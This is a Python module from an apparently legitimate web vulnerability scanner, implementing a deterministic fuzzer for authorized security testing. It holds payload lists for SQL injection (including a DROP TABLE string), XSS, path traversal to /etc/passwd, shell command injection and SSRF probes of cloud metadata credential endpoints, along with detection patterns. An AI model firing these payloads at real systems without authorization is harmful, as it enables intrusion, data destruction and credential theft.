"""
Fast deterministic pre-fuzzer — sends known-good payloads before LLM analysis.

Quickly identifies low-hanging fruit (error-based SQLi, obvious XSS reflection,
path traversal) using deterministic payloads, no LLM calls required.
Runs BEFORE the agent loop to seed initial findings.
"""

from __future__ import annotations

from typing import Any

from senshi.analysis.differ import ResponseDiffer
from senshi.core.session import Session
from senshi.reporters.models import Confidence, Finding, ScanMode, Severity
from senshi.utils.logger import get_logger

logger = get_logger("senshi.dast.fuzzer")

# Deterministic payload sets — no LLM needed
FUZZ_PAYLOADS = {
    "sqli": [
        ("'", "Single quote"),
        ("\"", "Double quote"),
        ("' OR '1'='1", "Classic OR bypass"),
        ("'; DROP TABLE --", "DROP TABLE"),
        ("1 UNION SELECT NULL--", "UNION SELECT"),
        ("1' AND SLEEP(5)--", "Blind time-based"),
    ],
    "xss": [
        ("<script>alert(1)</script>", "Basic script tag"),
        ('"><img src=x onerror=alert(1)>', "Event handler"),
        ("{{7*7}}", "SSTI / template injection"),
        ("${7*7}", "Expression language"),
        ("javascript:alert(1)", "JS protocol"),
    ],
    "path_traversal": [
        ("../../../etc/passwd", "Linux passwd"),
        ("..\\..\\..\\windows\\win.ini", "Windows win.ini"),
        ("....//....//....//etc/passwd", "Double-dot bypass"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL-encoded"),
    ],
    "cmdi": [
        ("; id", "Semicolon id"),
        ("| id", "Pipe id"),
        ("$(id)", "Command substitution"),
        ("`id`", "Backtick"),
        ("|| whoami", "OR whoami"),
    ],
    "ssrf": [
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
        ("http://metadata.google.internal/", "GCP metadata"),
        ("http://100.100.100.200/latest/meta-data/", "Alibaba metadata"),
        ("http://127.0.0.1:80", "Localhost"),
        ("http://[::1]", "IPv6 localhost"),
    ],
}

# Patterns indicating successful exploitation
DETECT_PATTERNS = {
    "sqli": [
        "sql syntax", "mysql", "postgresql", "ora-", "sqlstate",
        "unclosed quotation", "unterminated string",
    ],
    "xss": [
        "<script>alert(1)</script>", "onerror=alert(1)", "{{49}}",
    ],
    "path_traversal": [
        "root:x:0:0:", "bin/bash", "[fonts]", "for 16-bit",
    ],
    "cmdi": [
        "uid=", "gid=", "groups=",
    ],
    "ssrf": [
        "ami-id", "instance-id", "iam/security-credentials",
        "computeMetadata", "meta-data",
    ],
}


class DeterministicFuzzer:
    """
    Fast pre-fuzzer — no LLM required.

    Sends known payloads, checks for known patterns.
    Use before the agent loop to quickly find obvious vulns.
    """

    def __init__(self, session: Session) -> None:
        self.session = session
        self.differ = ResponseDiffer()

    def fuzz_endpoint(
        self,
        url: str,
        method: str = "GET",
        params: list[str] | None = None,
        vuln_types: list[str] | None = None,
    ) -> list[Finding]:
        """Fuzz an endpoint with deterministic payloads."""
        if not params:
            return []

        types = vuln_types or list(FUZZ_PAYLOADS.keys())
        findings: list[Finding] = []

        # Get baseline
        try:
            baseline = self.session.get(url)
        except Exception:
            return []

        for vuln_type in types:
            payloads = FUZZ_PAYLOADS.get(vuln_type, [])
            detect = DETECT_PATTERNS.get(vuln_type, [])

            for param in params:
                for payload_value, technique in payloads:
                    try:
                        if method.upper() == "GET":
                            response = self.session.get(url, params={param: payload_value})
                        else:
                            response = self.session.post(url, data={param: payload_value})

                        # Check for detection patterns
                        body_lower = response.body.lower()
                        for pattern in detect:
                            if pattern.lower() in body_lower:
                                findings.append(Finding(
                                    title=f"{vuln_type.upper()} detected in {param} — {technique}",
                                    severity=self._severity_for(vuln_type),
                                    confidence=Confidence.LIKELY,
                                    category=vuln_type,
                                    description=f"Deterministic fuzzing found {vuln_type} via {technique}",
                                    mode=ScanMode.DAST,
                                    endpoint=url,
                                    method=method,
                                    payload=f"{param}={payload_value}",
                                    status_code=response.status_code,
                                    response_snippet=response.body[:300],
                                    evidence=f"Pattern matched: {pattern}",
                                ))
                                break

                        # Check response diff
                        is_diff, reason = self.differ.quick_diff(baseline.body, response.body)
                        if is_diff and response.status_code >= 500:
                            findings.append(Finding(
                                title=f"Server error on {param} with {vuln_type} payload",
                                severity=Severity.MEDIUM,
                                confidence=Confidence.POSSIBLE,
                                category=vuln_type,
                                mode=ScanMode.DAST,
                                endpoint=url,
                                method=method,
                                payload=f"{param}={payload_value}",
                                status_code=response.status_code,
                                evidence=reason,
                            ))

                    except Exception as e:
                        logger.debug(f"Fuzz error: {e}")

        return self._deduplicate(findings)

    @staticmethod
    def _severity_for(vuln_type: str) -> Severity:
        return {
            "sqli": Severity.CRITICAL,
            "cmdi": Severity.CRITICAL,
            "ssrf": Severity.HIGH,
            "xss": Severity.HIGH,
            "path_traversal": Severity.HIGH,
        }.get(vuln_type, Severity.MEDIUM)

    @staticmethod
    def _deduplicate(findings: list[Finding]) -> list[Finding]:
        seen: set[str] = set()
        unique: list[Finding] = []
        for f in findings:
            key = f"{f.category}:{f.endpoint}:{f.title}"
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique
